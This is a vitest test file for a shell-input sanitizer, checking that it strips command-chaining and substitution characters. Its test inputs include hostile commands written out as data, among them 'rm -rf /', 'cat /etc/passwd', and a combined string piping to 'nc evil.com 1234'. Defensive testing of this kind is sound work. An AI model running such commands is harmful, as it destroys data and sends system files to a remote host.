import { describe, it, expect } from 'vitest'
import { sanitizeInput } from './sanitize'

describe('sanitizeInput', () => {
  it('passes through normal text', () => {
    expect(sanitizeInput('hello world')).toBe('hello world')
  })

  it('passes through slashes for commands', () => {
    expect(sanitizeInput('/new')).toBe('/new')
    expect(sanitizeInput('/reset')).toBe('/reset')
  })

  it('strips semicolons (command chaining)', () => {
    expect(sanitizeInput('hello; rm -rf /')).toBe('hello rm -rf /')
  })

  it('strips pipe operators', () => {
    expect(sanitizeInput('input | cat /etc/passwd')).toBe('input  cat /etc/passwd')
  })

  it('strips backticks (command substitution)', () => {
    expect(sanitizeInput('hello `whoami`')).toBe('hello whoami')
  })

  it('strips dollar signs and parens (subshell)', () => {
    expect(sanitizeInput('hello $(whoami)')).toBe('hello whoami')
  })

  it('strips curly braces', () => {
    expect(sanitizeInput('{echo,hello}')).toBe('echo,hello')
  })

  it('strips backslashes', () => {
    expect(sanitizeInput('he\\llo')).toBe('hello')
  })

  it('strips angle brackets', () => {
    expect(sanitizeInput('hello > /dev/null')).toBe('hello  /dev/null')
  })

  it('strips ampersands', () => {
    expect(sanitizeInput('cmd1 && cmd2')).toBe('cmd1  cmd2')
  })

  it('strips hash (comment injection)', () => {
    expect(sanitizeInput('input # ignore rest')).toBe('input  ignore rest')
  })

  it('strips exclamation marks', () => {
    expect(sanitizeInput('!event')).toBe('event')
  })

  it('limits to 500 characters', () => {
    const long = 'a'.repeat(600)
    expect(sanitizeInput(long)).toHaveLength(500)
  })

  it('trims whitespace', () => {
    expect(sanitizeInput('  hello  ')).toBe('hello')
  })

  it('handles combined attack string', () => {
    const attack = '$(cat /etc/passwd); rm -rf / & echo pwned | nc evil.com 1234'
    const result = sanitizeInput(attack)
    expect(result).not.toContain('$')
    expect(result).not.toContain(';')
    expect(result).not.toContain('&')
    expect(result).not.toContain('|')
    expect(result).not.toContain('(')
    expect(result).not.toContain(')')
  })

  it('preserves URLs', () => {
    expect(sanitizeInput('https://loom.com/share/abc123')).toBe('https://loom.com/share/abc123')
  })

  it('returns empty string for all-metacharacter input', () => {
    expect(sanitizeInput(';|&`$()')).toBe('')
  })
})
